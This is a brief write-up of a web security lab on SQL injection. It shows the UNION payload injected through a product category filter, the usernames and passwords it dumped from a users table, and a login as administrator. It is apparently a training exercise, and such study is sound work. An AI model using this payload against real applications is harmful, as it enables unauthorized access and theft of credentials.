# Lab: SQL injection UNION attack, retrieving data from other tables

**Vulnerability:** Product category filter

**Goal:** Read `username` / `password` from the `users` table and log in as administrator

## Steps

1. Inject a UNION query targeting the known `users` table directly:
   ```
   ' UNION SELECT username, password FROM users--
   ```
   ![union select users](screenshots/01-union-select-users.png)

## Result

| Username | Password |
|---|---|
| administrator | jhc50yv5j5t3f42o2bw2 |
| carlos | yae5isspl66woljg81vs |
| wiener | lba336kw1x19lak1uxuy |

Logged in as `administrator`.

![lab solved](screenshots/02-lab-solved.png)

✅ **Lab solved**
